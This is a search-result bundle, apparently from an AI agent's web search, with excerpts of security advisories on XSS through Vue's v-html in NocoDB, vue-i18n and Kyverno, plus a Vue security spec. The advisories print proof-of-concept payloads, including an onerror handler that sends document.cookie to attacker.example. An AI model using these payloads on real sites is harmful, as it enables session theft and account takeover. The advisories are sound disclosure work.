{"query":"\"v-html\" \"XSS\" security advisory github","data":"Stored Cross-Site Scripting via Rich Text Cells · Advisory · nocodb/nocodb · GitHub (https://github.com/nocodb/nocodb/security/advisories/GHSA-wwp2-x4rj-j8rm)\n【turn837460search0】 [wordlim: 200] Published: 8 months ago; Crawled: 6 days ago; Rich text cell content rendered via `v-html` without sanitization, enabling stored XSS. ... This issue was discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members @p- (Peter Stockli) and @m-y-mo (Man Yue Mo).\n\n# Stored Cross-Site Scripting via Rich Text Cells\n\nHigh\n\nmertmit published GHSA-wwp2-x4rj-j8rm Mar 2, 2026\n\n## Package\n\nnocodb (npm)\n\n## Affected versions\n\n<= 0.301.2\n\n## Patched versions\n\n0.301.3\n\n## Description\n\n### Summary\n\nRich text cell content rendered via `v-html` without sanitization, enabling stored XSS.\n\n### Details\n\nRich text in `TextArea.vue` was parsed by markdown-it with `html: true` and injected via `v-html` without DOMPurify. A user with Editor role can inject arbitrary HTML that executes for all viewers.\n\n### Impact\n\nStored XSS — malicious scripts execute for any user viewing the cell.\n\n### Credit\n\nThis issue was discovered by an AI agent developed by the GitHub Security Lab and reviewed by GHSL team members @p- (Peter Stockli) and @m-y-mo (Man Yue Mo).\n\n### Severity\n\nHigh\n\n### CVE ID\n\nCVE-2026-28401\n\n### Weaknesses\n\nWeakness CWE-79\n\n#### Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nThe product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. Learn more on MITRE.\n--------------------------------------------------------------------------------\nVue I18n: escapeParameter does not prevent XSS through srcdoc in translation messages · CVE-2026-118257 · GitHub Advisory Database · GitHub (https://github.com/advisories/GHSA-83rm-6c8r-g728)\n【turn837460search1】 [wordlim: 200] Published: 3 weeks ago; Crawled: 3 days ago; `sanitizeTranslatedHtml()` (`packages/shared/src/sanitize.ts` in v11.4.13) works on the final translated string: ... An attacker can then run script in the origin of the application (DOM-based XSS), despite the sanitizer. ... Published to the GitHub Advisory Database Oct 28, 2026\n    \n    const i18n = createI18n({\n      legacy: false,\n      locale: 'en',\n      escapeParameter: true,\n      messages: {\n        en: { message: '<iframe srcdoc=\"<b>x</b>\"></iframe>' }\n      }\n    })\n    \n    console.log(i18n.global.t('message'))\n    // v11.4.13: <iframe srcdoc=\"&lt;b&gt;x&lt;/b&gt;\"></iframe>\n\nThe browser decodes the value and renders `<b>x</b>` as a separate document inside the `<iframe>`, in the same origin as the page. Any markup in that position is parsed the same way.\n\n### Impact\n\nApplications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and one of the following applies:\n\n  * an untrusted value is passed as a parameter that the message places inside `srcdoc`,\n  * message content is not fully trusted (for example crowdsourced or stored translations), or\n  * untrusted named values are passed in the same call as a list (GHSA-8rc2-428q-7ww3).\n\nAn attacker can then run script in the origin of the application (DOM-based XSS), despite the sanitizer.\n\nRendering through `<i18n-t>` is not affected, since it does not render translations as HTML.\n\n### Patches\n\nFixed in 11.4.14 and 12.0.0-alpha.5. The sanitizer now neutralizes the `srcdoc` attribute itself, in the same way as event handler attributes.\n\nv9 and v10 are no longer supported and will not be fixed. Please migrate to v11.\n\n### Workarounds\n\n  * Do not render translations that can contain untrusted content with `v-html`. Use component interpolation (`<i18n-t>`) instead.\n  * Do not put `srcdoc` in translation messages, and do not pass values into it.\n\n### References\n\n  * CWE-79, CWE-116\n  * GHSA-x8qp-wqqm-57ph (CVE-2025-53892): the fix that added `sanitizeTranslatedHtml()`\n  * GHSA-8rc2-428q-7ww3: named values are not escaped when a list is also passed\n  * HTML Standard: the `srcdoc` attribute\n\nkazupon published to intlify/vue-i18n Oct 10, 2026\n\nPublished to the GitHub Advisory Database Oct 28, 2026\n\nReviewed Oct 28, 2026\n\nLast updated Oct 28, 2026\n\n### Severity\n\nHigh\n\n7.2\n\n# CVSS overall score\n\nThis score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).\n\n#### CVSS v3 base metrics\n\nAttack vector\n\nNetwork\n\nAttack complexity\n\nLow\n\nPrivileges required\n\nNone\n\nUser interaction\n\nNone\n\nScope\n\nChanged\n\nConfidentiality\n\nLow\n\nIntegrity\n\nLow\n\nAvailability\n\nNone\n\nLearn more about base metrics\n\n--------------------------------------------------------------------------------\nOSV - Open Source Vulnerabilities (https://osv.dev/vulnerability/GHSA-8rc2-428q-7ww3)\n【turn837460search2】 [wordlim: 200] Published: 6 days ago; Crawled: 3 days ago; Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and pass untrusted named values in the same call as a list. ... Together with GHSA-83rm-6c8r-g728, or on versions without the sanitizer, this leads to script execution (DOM-based XSS).\n\n`<i18n-t>` is not affected: it passes either list or named values, never both, and it does not render translations as HTML.\n\n### PoC\n    \n    `import { createI18n } from 'vue-i18n'\n    \n    const i18n = createI18n({\n      legacy: false,\n      locale: 'en',\n      escapeParameter: true,\n      messages: {\n        en: { withList: '{0} {name}', withoutList: '{name}' }\n      }\n    })\n    const t = i18n.global.t\n    \n    t('withoutList', { name: '<b>x</b>' })\n    // &lt;b&gt;x&lt;&#x2F;b&gt;      escaped\n    \n    t('withList', ['a'], { named: { name: '<b>x</b>' } })\n    // a <b>x</b>                   not escaped (v11.4.13)\n    `\n\n### Impact\n\nApplications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and pass untrusted named values in the same call as a list. The named values are inserted as markup: phishing links, forms, or layout changes. Together with GHSA-83rm-6c8r-g728, or on versions without the sanitizer, this leads to script execution (DOM-based XSS).\n\n### Patches\n\nFixed in 11.4.14 and 12.0.0-alpha.5. `escapeParams()` now escapes both the list and the named values.\n\nThe fix also stops rewriting the named object that the caller passes. Before, the values of that object were replaced with their escaped form, so a second call with the same object escaped them twice.\n\nv9 and v10 are no longer supported and will not be fixed. Please migrate to v11.\n\n### Workarounds\n\n  * Do not pass list and named values in the same call when `escapeParameter` is enabled.\n  * Do not render translations that can contain untrusted values with `v-html`. Use component interpolation (`<i18n-t>`) instead.\n\n--------------------------------------------------------------------------------\nskills/skills/.curated/security-best-practices/references/javascript-typescript-vue-web-frontend-security.md at main · openai/skills · GitHub (https://github.com/openai/skills/blob/main/skills/.curated/security-best-practices/references/javascript-typescript-vue-web-frontend-security.md)\n【turn837460search3】 [wordlim: 200] Crawled: last week;   * MUST NOT “fix” security by disabling protections (e.g., weakening CSP, turning on unsafe template compilation, using `v-html` as a shortcut, bypassing backend auth, or “just store the token in localStorage”). ...   * For apps with significant DOM injection surface (rich text, plugins, `v-html`), SHOULD consider enabling Trusted Types to reduce DOM XSS risk. (web.dev) ...   * When using SSR, MUST treat anything injected into the HTML document (initial state, serialized data, inline scripts) as XSS-sensitive.\n\n# Vue.js Web Security Spec (Vue 3.x, TypeScript/JavaScript, common tooling: Vite)\n\nThis document is designed as a security spec that supports:\n\n  1. Secure-by-default code generation for new Vue code.\n  2. Security review / vulnerability hunting in existing Vue code (passive “notice issues while working” and active “scan the repo and report findings”).\n\nIt is intentionally written as a set of normative requirements (“MUST/SHOULD/MAY”) plus audit rules (what bad patterns look like, how to detect them, and how to fix/mitigate them).\n\n* * *\n\n## 0) Safety, boundaries, and anti-abuse constraints (MUST FOLLOW)\n\n  * MUST NOT request, output, log, or commit secrets (API keys, passwords, private keys, session cookies, auth tokens).\n  * MUST NOT “fix” security by disabling protections (e.g., weakening CSP, turning on unsafe template compilation, using `v-html` as a shortcut, bypassing backend auth, or “just store the token in localStorage”).\n  * MUST provide evidence-based findings during audits: cite file paths, code snippets, and configuration values that justify the claim.\n\n### VUE-XSS-001: Prefer Vue’s default escaping; avoid raw HTML injection\n\nSeverity: High\n\nRequired:\n\n  * MUST rely on Vue’s automatic escaping for text interpolation and attribute binding where possible. (Vue.js)\n\n  * MUST NOT render user-provided HTML via:\n\n    * `v-html`\n    * `innerHTML` in render functions / JSX\n    * direct DOM APIs (`element.innerHTML`, `insertAdjacentHTML`) unless the HTML is trusted or robustly sanitized and the risk is explicitly accepted. (Vue.js)\n\nInsecure patterns:\n\n  * `<div v-html=\"userProvidedHtml\"></div>`\n  * `h('div', { innerHTML: userProvidedHtml })`\n  * `<div innerHTML={userProvidedHtml}></div>`\n  * `el.innerHTML = untrusted`\n\nDetection hints:\n\n  * Search: `v-html`, `innerHTML`, `insertAdjacentHTML`, `DOMParser`, `document.write`.\n\nFix:\n\n  * Render untrusted content as text (interpolation).\n  * If HTML rendering is required (e.g., Markdown), sanitize with a well-maintained HTML sanitizer and apply defense-in-depth (CSP, Trusted Types). \n### VUE-CSP-001: Use Trusted Types and DOM XSS hardening when feasible\n\nSeverity: Low\n\nRequired:\n\n  * For apps with significant DOM injection surface (rich text, plugins, `v-html`), SHOULD consider enabling Trusted Types to reduce DOM XSS risk. (web.dev)\n  * SHOULD treat Trusted Types as defense-in-depth, not a replacement for sanitization.\n\nInsecure patterns:\n\n  * Frequent use of `innerHTML`/`v-html` without sanitization or CSP hardening.\n\nDetection hints:\n\n  * Search: `v-html`, `innerHTML`, `insertAdjacentHTML`.\n  * Check CSP for `require-trusted-types-for 'script'` usage (if headers are in repo).\n\nFix:\n\n  * Reduce/centralize HTML injection, sanitize inputs, and add Trusted Types policies where appropriate.\n\n* * *\n\n### VUE-THIRDPARTY-001: Avoid dynamic third-party script injection; prefer static, vetted loading\n\nSeverity: Low\n\nRequired:\n\n  * MUST NOT inject `<script src=\"...\">` where the URL is user-controlled.\n  * SHOULD treat third-party widgets/analytics as supply-chain risk; load only from vetted, pinned sources.\n\n--------------------------------------------------------------------------------\nIssue: escapeParameterHtml does not prevent DOM-based XSS via tag attributes like onerror · Advisory · intlify/vue-i18n · GitHub (https://github.com/intlify/vue-i18n/security/advisories/GHSA-x8qp-wqqm-57ph)\n【turn837460search4】 [wordlim: 200] Published: 1.3 years ago; Crawled: today; This may lead to a DOM-based XSS vulnerability, even when using escapeParameterHtml: true, if a translation string includes minor HTML and is rendered via v-html. ... This creates a DOM-based Cross-Site Scripting (XSS) vulnerability despite enabling a security option (escapeParameterHtml) .\n\n  1. intlify\n  2. vue-i18n\n\n# Issue: escapeParameterHtml does not prevent DOM-based XSS via tag attributes like onerror\n\nHigh\n\nkazupon published GHSA-x8qp-wqqm-57ph Jul 16, 2025\n\n## Package\n\n@intlify/core (npm)\n\n## Affected versions\n\n>= 9.0.0\n\n## Patched versions\n\n9.14.5, 10.0.8, 11.1.10\n\n@intlify/core-base (npm)\n\n>= 9.0.0\n\n9.14.5, 10.0.8, 11.1.10\n\n@intlify/vue-i18n-core (npm)\n\n>= 9.2.0\n\n9.14.5, 10.0.8,11.1.10\n\npetite-vue-i18n (npm)\n\n>= 10.0.0\n\n10.0.8, 11.1.10\n\nvue-i18n (npm)\n\n>= 9.0.0\n\n9.14.5, 10.0.8, 11.1.10\n\n## Description\n\n### Summary\n\nThe escapeParameterHtml: true option in Vue I18n is designed to protect against HTML/script injection by escaping interpolated parameters. However, this setting fails to prevent execution of certain tag-based payloads, such as , if the interpolated value is inserted inside an HTML context using v-html.\n\nThis may lead to a DOM-based XSS vulnerability, even when using escapeParameterHtml: true, if a translation string includes minor HTML and is rendered via v-html.\n\nWhen escapeParameterHtml: true is enabled, it correctly escapes common injection points.\n\nHowever, it does not sanitize entire attribute contexts, which can be used as XSS vectors via:\n\n`<img src=x onerror=alert(1)> `\n\n\n### PoC\n\nIn your Vue I18n configuration:\n    \n    `const i18n = createI18n({\n      escapeParameterHtml: true,\n      messages: {\n        en: {\n          vulnerable: 'Caution: <img src=x onerror=\"{payload}\">'\n        }\n      }\n    });\n    `\n\nUse this interpolated payload:\n\n`const payload = '<script>alert(\"xss\")</script>';`\nRender the translation using v-html (even not using v-html):\n\n`<p v-html=\"$t('vulnerable', { payload })\"></p> `\nExpected: escaped content should render as text, not execute.\n\nActual: script executes in some environments (or the payload is partially parsed as HTML).\n\n### Impact\n\nThis creates a DOM-based Cross-Site Scripting (XSS) vulnerability despite enabling a security option (escapeParameterHtml) .\n\n### Severity\n\nHigh\n\n### CVE ID\n\nCVE-2025-53892\n\n### Weaknesses\n\nNo CWEs\n--------------------------------------------------------------------------------\nGHSL-2026-030: Stored cross-site scripting (XSS) in NocoDB leading to potential unauthorized script execution - CVE-2026-28401 | GitHub Security Lab (https://securitylab.github.com/advisories/GHSL-2026-030_nocodb/)\n【turn837460search5】 [wordlim: 200] Published: 7 months ago; Crawled: last week;   * 2026-03-02: Advisory and fix were released. ... NocoDB version v0.301.2 is vulnerable to a stored cross-site scripting (XSS) attack (GHSL-2026-030) that allows malicious scripts to be injected into rich text cells, potentially leading to unauthorized script execution in the context of other users. ... This allows authenticated attackers to inject malicious HTML/JavaScript that executes in the browser context of any user viewing the affected record, potentially leading to session hijacking, credential theft, or unauthorized actions performed on behalf of privileged users. ... This issue was discovered with the GitHub Security Lab Taskflow Agent and manually verified by GHSL team members @p- (Peter Stöckli) and @m-y-mo (Man Yue Mo).\n\nApril 3, 2026\n\n# GHSL-2026-030: Stored cross-site scripting (XSS) in NocoDB leading to potential unauthorized script execution - CVE-2026-28401\n\nPeter Stöckli\n\n## Coordinated Disclosure Timeline\n\n  * 2026-02-09: Vulnerability was reported via GitHub’s private vulnerability reporting feature.\n  * 2026-03-02: Advisory and fix were released.\n\n## Summary\n\nNocoDB version v0.301.2 is vulnerable to a stored cross-site scripting (XSS) attack (GHSL-2026-030) that allows malicious scripts to be injected into rich text cells, potentially leading to unauthorized script execution in the context of other users.\n\n## Project\n\nnocodb\n\n## Tested Version\n\nv0.301.2\n\n## Details\n\n### Stored Cross-Site Scripting in rich text cells (`GHSL-2026-030`)\n\nA stored cross-site scripting vulnerability exists in NocoDB’s Rich Text cell rendering functionality. When a Long Text field is configured with rich text mode enabled, user-supplied content is parsed through a Markdown parser that has HTML passthrough enabled and is subsequently rendered using Vue’s `v-html` directive without sanitization. This allows authenticated attackers to inject malicious HTML/JavaScript that executes in the browser context of any user viewing the affected record, potentially leading to session hijacking, credential theft, or unauthorized actions performed on behalf of privileged users.\n\nThe `v-html` directive inside of the TextArea component renders `richTextContent` directly into the DOM.\n\nThe `NcMarkdownParser` uses markdown-it configured with `html: true`, which allows raw HTML to pass through unchanged.\n\n#### Impact\n\nThis issue may lead to account takeover due to stored Cross-site scripting (XSS).\n\n#### CWEs\n\n  * CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)\n\n## CVE\n\n  * CVE-2026-28401\n\n## Credit\n\nThis issue was discovered with the GitHub Security Lab Taskflow Agent and manually verified by GHSL team members @p- (Peter Stöckli) and @m-y-mo (Man Yue Mo).\n--------------------------------------------------------------------------------\nOSV - Open Source Vulnerabilities (https://osv.dev/vulnerability/GHSA-83rm-6c8r-g728)\n【turn837460search6】 [wordlim: 200] Published: 6 days ago; Crawled: 3 days ago;     https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-83rm-6c8r-g728/GHSA-83rm-6c8r-g728.json ... Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and one of the following applies: ... An attacker can then run script in the origin of the application (DOM-based XSS), despite the sanitizer.\n    `\n\nThe browser decodes the value and renders `<b>x</b>` as a separate document inside the `<iframe>`, in the same origin as the page. Any markup in that position is parsed the same way.\n\n### Impact\n\nApplications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and one of the following applies:\n\n  * an untrusted value is passed as a parameter that the message places inside `srcdoc`,\n  * message content is not fully trusted (for example crowdsourced or stored translations), or\n  * untrusted named values are passed in the same call as a list (GHSA-8rc2-428q-7ww3).\n\nAn attacker can then run script in the origin of the application (DOM-based XSS), despite the sanitizer.\n\nRendering through `<i18n-t>` is not affected, since it does not render translations as HTML.\n\n### Patches\n\nFixed in 11.4.14 and 12.0.0-alpha.5. The sanitizer now neutralizes the `srcdoc` attribute itself, in the same way as event handler attributes.\n\nv9 and v10 are no longer supported and will not be fixed. Please migrate to v11.\n\n### Workarounds\n\n  * Do not render translations that can contain untrusted content with `v-html`. Use component interpolation (`<i18n-t>`) instead.\n  * Do not put `srcdoc` in translation messages, and do not pass values into it.\n\n### References\n\n  * CWE-79, CWE-116\n  * GHSA-x8qp-wqqm-57ph (CVE-2025-53892): the fix that added `sanitizeTranslatedHtml()`\n  * GHSA-8rc2-428q-7ww3: named values are not escaped when a list is also passed\n  * HTML Standard: the `srcdoc` attribute\n\n--------------------------------------------------------------------------------\nvue-i18n's escapeParameterHtml does not prevent DOM-based XSS through its tag attributes · CVE-2025-53892 · GitHub Advisory Database · GitHub (https://github.com/advisories/GHSA-x8qp-wqqm-57ph)\n【turn837460search7】 [wordlim: 200] Published: 1.3 years ago; Crawled: yesterday; This creates a DOM-based Cross-Site Scripting (XSS) vulnerability despite enabling a security option (escapeParameterHtml) . ...   * https://github.com/intlify/vue-i18n/releases/tag/v10.0.8\n\n## Description\n\n### Summary\n\nThe escapeParameterHtml: true option in Vue I18n is designed to protect against HTML/script injection by escaping interpolated parameters. However, this setting fails to prevent execution of certain tag-based payloads, such as `<img src=x onerror=...>`, if the interpolated value is inserted inside an HTML context using v-html.\n\nThis may lead to a DOM-based XSS vulnerability, even when using escapeParameterHtml: true, if a translation string includes minor HTML and is rendered via v-html.\n\n### Details\n\nWhen escapeParameterHtml: true is enabled, it correctly escapes common injection points.\n\nHowever, it does not sanitize entire attribute contexts, which can be used as XSS vectors via:\n\n`<img src=x onerror=alert(1)> `\n\n### PoC\n\nIn your Vue I18n configuration:\n    \n    `const i18n = createI18n({\n      escapeParameterHtml: true,\n      messages: {\n        en: {\n          vulnerable: 'Caution: <img src=x onerror=\"{payload}\">'\n        }\n      }\n    });\n    `\n\nUse this interpolated payload:\n\n`const payload = '<script>alert(\"xss\")</script>';`\nRender the translation using v-html (even not using v-html):\n\n`<p v-html=\"$t('vulnerable', { payload })\"></p> `\nExpected: escaped content should render as text, not execute.\n\nActual: script executes in some environments (or the payload is partially parsed as HTML).\n\n### Impact\n\nThis creates a DOM-based Cross-Site Scripting (XSS) vulnerability despite enabling a security option (escapeParameterHtml) .\n\n### References\n\n  * GHSA-x8qp-wqqm-57ph\n  * https://nvd.nist.gov/vuln/detail/CVE-2025-53892\n  * intlify/vue-i18n#2229\n  * intlify/vue-i18n#2230\n  * intlify/vue-i18n@`49f9824`\n  * intlify/vue-i18n@`a470996`\n  * https://github.com/intlify/vue-i18n/releases/tag/v10.0.8\n  * https://github.com/intlify/vue-i18n/releases/tag/v11.1.10\n  * https://github.com/intlify/vue-i18n/releases/tag/v9.14.5\n\n--------------------------------------------------------------------------------\nKyverno policy-reporter-ui has XSS via Stored Property Values in PropertyCard Component · CVE-2026-44245 · GitHub Advisory Database · GitHub (https://github.com/advisories/GHSA-q98m-7w8c-w388)\n【turn837460search8】 [wordlim: 200] Published: 6 months ago; Crawled: 2 months ago; ## Kyverno policy-reporter-ui has XSS via Stored Property Values in PropertyCard Component ... Vue 3's v-html directive is the framework-documented mechanism for injecting raw HTML, and it intentionally disables the auto-escaping that {{ }} interpolation provides. ... Published to the GitHub Advisory Database May 6, 2026\n\n## Kyverno policy-reporter-ui has XSS via Stored Property Values in PropertyCard Component\n\nModerate severity GitHub Reviewed Published Apr 29, 2026 in kyverno/kyverno • Updated May 13, 2026\n\nVulnerability details Dependabot alerts 0\n\n## Package\n\ngithub.com/kyverno/policy-reporter-ui (Go)\n\n## Affected versions\n\n<= 2.5.1\n\n## Patched versions\n\n2.5.2\n\n## Description\n\n### Summary\n\nVue 3's v-html directive is the framework-documented mechanism for injecting raw HTML, and it intentionally disables the auto-escaping that {{ }} interpolation provides. The PropertyCard.vue component uses v-html for the else branch of the URL check, meaning any non-URL string value flows directly into the DOM as HTML. The isURL() guard only filters values that parse as http: or https: URLs, so any HTML payload not starting with those schemes (e.g., `<img src=x onerror=alert(1)>` padded to exceed 75 chars) bypasses it entirely. The data originates from Kubernetes PolicyReport .results[].properties fields, which are arbitrary string maps populated by policy engines and potentially by any principal with write access to PolicyReport objects in the cluster.         # Value > 75 chars and not an http/https URL -> routed to v-html sink\n        advisory: \"<img src=x onerror=\\\"fetch('[https://attacker.example/c?c='+document.cookie](https://attacker.example/c?c=%27+document.cookie))\\\"> padding padding padding\"\n    EOF\n    # Once a UI user opens the results table for the 'default' namespace\n    # and expands the 'xss-test-policy' result row, the onerror handler fires\n    # and exfiltrates their session cookies to attacker.example\n\n### Impact\n\nXSS\n\n### References\n\n  * GHSA-q98m-7w8c-w388\n  * https://nvd.nist.gov/vuln/detail/CVE-2026-44245\n\nrealshuting published to kyverno/kyverno Apr 29, 2026\n\nPublished to the GitHub Advisory Database May 6, 2026\n\nReviewed May 6, 2026\n\nPublished by the National Vulnerability Database May 12, 2026\n\nLast updated May 13, 2026\n\n### Severity\n\n6.1\n\n# CVSS overall score\n\nThis score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).\n\n--------------------------------------------------------------------------------\nGHSL-2026-031: Stored cross-site scripting (XSS) in NocoDB leading to potential account takeover - CVE-2026-28397 | GitHub Security Lab (https://securitylab.github.com/advisories/GHSL-2026-031_nocodb/)\n【turn837460search9】 [wordlim: 200] Published: 7 months ago; Crawled: 3 days ago;   * 2026-03-02: Advisory and fix were released. ... NocoDB version v0.301.2 is vulnerable to a stored cross-site scripting (XSS) attack (GHSL-2026-031), where malicious scripts can be injected into comments. ... Authenticated attackers can inject malicious HTML/JavaScript into comment fields, which are then rendered without sanitization when other users view the comments. ... This issue was discovered with the GitHub Security Lab Taskflow Agent and manually verified by GHSL team members @p- (Peter Stöckli) and @m-y-mo (Man Yue Mo).\n\nApril 3, 2026\n\n# GHSL-2026-031: Stored cross-site scripting (XSS) in NocoDB leading to potential account takeover - CVE-2026-28397\n\nPeter Stöckli\n\n## Coordinated Disclosure Timeline\n\n  * 2026-02-09: Vulnerability was reported via GitHub’s private vulnerability reporting feature.\n  * 2026-03-02: Advisory and fix were released.\n\n## Summary\n\nNocoDB version v0.301.2 is vulnerable to a stored cross-site scripting (XSS) attack (GHSL-2026-031), where malicious scripts can be injected into comments.\n\n## Project\n\nnocodb\n\n## Tested Version\n\nv0.301.2\n\n## Details\n\n### Stored Cross-Site Scripting in Comments (`GHSL-2026-031`)\n\nA Stored Cross-Site Scripting (XSS) vulnerability exists in NocoDB’s expanded form comments feature. Authenticated attackers can inject malicious HTML/JavaScript into comment fields, which are then rendered without sanitization when other users view the comments. This allows arbitrary JavaScript execution in victims’ browser contexts, potentially leading to session hijacking, data theft, or unauthorized actions.\n\nComments are rendered using Vue’s `v-html` sink, which is used to render HTML.\n    \n    `<div class=\"nc-rich-text-content !text-small !leading-18px !text-nc-content-gray\"\n      v-html=\"parsedHtmlComments[commentItem.id]\">\n    </div>\n    `\n\n`parsedHtmlComments` generates HTML using `NcMarkdownParser.parse()` with no additional sanitization.\n\nThe `NcMarkdownParser` uses markdown-it configured with `html: true`, which allows raw HTML to pass through unchanged.\n\n#### Impact\n\nThis issue may lead to account takeover due to stored Cross-site scripting (XSS).\n\n#### CWEs\n\n  * CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)\n\n## CVE\n\n  * CVE-2026-28397\n\n## Credit\n\nThis issue was discovered with the GitHub Security Lab Taskflow Agent and manually verified by GHSL team members @p- (Peter Stöckli) and @m-y-mo (Man Yue Mo).\n--------------------------------------------------------------------------------\nOSV - Open Source Vulnerabilities (https://osv.dev/vulnerability/GHSA-8vm4-g489-v3w7)\n【turn837460search10】 [wordlim: 200] Published: 8 months ago; Crawled: 4 months ago;     https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8vm4-g489-v3w7/GHSA-8vm4-g489-v3w7.json ... User-controlled content in comments and rich text cells was rendered via `v-html` without sanitization, enabling stored XSS. ...   * https://github.com/nocodb/nocodb/security/advisories/GHSA-8vm4-g489-v3w7\n\n# GHSA-8vm4-g489-v3w7\n\nSuggest an improvement\n\nSource\n    https://github.com/advisories/GHSA-8vm4-g489-v3w7\nImport Source\n    https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8vm4-g489-v3w7/GHSA-8vm4-g489-v3w7.json\nJSON Data\n    https://api.osv.dev/v1/vulns/GHSA-8vm4-g489-v3w7\n\n  * CVE-2026-28398\nPublished\n    2026-03-03T20:58:44Z\nModified\n    2026-03-04T15:12:47.606592Z\nSeverity\n    \n\n  * 5.3 (Medium) CVSS_V4 - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N CVSS Calculator\nSummary\n    NocoDB Vulnerable to Stored Cross-Site Scripting via Comments and Rich Text Cells\nDetails\n    \n\n### Summary\n\nUser-controlled content in comments and rich text cells was rendered via `v-html` without sanitization, enabling stored XSS.\n\n### Details\n\nComments in `Comments.vue` and rich text in `TextArea.vue` were parsed by markdown-it with `html: true` and injected via `v-html`. \n--------------------------------------------------------------------------------\nSingCERT Bulletin Advisory (https://isomer-user-content.by.gov.sg/36/f52aa6d1-64a1-4543-a2a8-b033d0f9c5a6/26_Mar_2025.pdf)\n【turn837460search11】 [wordlim: 200] Published: 1.6 years ago; <td>In h2oai/h2o-3 version 3.46.0, an endpoint exposing a custom EncryptionTool allows an attacker to encrypt any files on the target server with a key of their choosing. ... This misconfiguration can lead to significant security vulnerabilities, allowing unauthorized origins to access paths meant to be restricted, resulting in data exposure and potential data leaks.</td> ... <td>A Cross-site Scripting (XSS) vulnerability exists in the Settings page of parisneo/lollms-webui version 9.8. The vulnerability is due to the improper use of the 'v-html' directive, which inserts the content of the 'full_template' variable directly as HTML.\n\n--------------------------------------------------------------------------------\nEmpowering Software Engineers to Design More Secure Web Applications: Guidelines and Potential of Using LLMs as a Recommender Tool (https://research.chalmers.se/publication/550678/file/550678_Fulltext.pdf)\n【turn837460search12】 [wordlim: 200] Published: 8 months ago; Crawled: 6 months ago; | Using `v-html` in Vue templates can lead to XSS attacks | The attribute v-html can be used to render HTML code in a Vue application. ... | Third-party GitHub Actions should be pinned | If a third-party GitHub Action is not pinned to a full-length commit SHA, there is a risk that an attacker could install a backdoor in the action repository [56]. ... | Using `document.write` methods can lead to XSS attacks | In JavaScript, the DOM property innerHTML can be exploited to perform XSS attacks because its content is rendered without sanitization [59].\n\n--------------------------------------------------------------------------------\n<table id=\"e1\"> (https://isomer-user-content.by.gov.sg/36/052acf24-4730-439f-ab3a-fcf6f94e7467/04_Mar_2026.pdf)\n【turn837460search13】 [wordlim: 200] Published: 8 months ago; This vulnerability allows low privileged users to embed malicious JS payloads on the server and perform stored XSS attack. ... Prior to version 0.301.3, user-controlled content in comments and rich text cells was rendered via v-html without sanitization, enabling stored XSS.\n\n--------------------------------------------------------------------------------\nT0150 – Widget Local Development (https://aulainfo.dk/media/i4hf1nxm/t0150-widget-local-development.pdf)\n【turn837460search14】 [wordlim: 200] Published: 1.6 years ago; While v-html can be a useful feature, it can also introduce a sec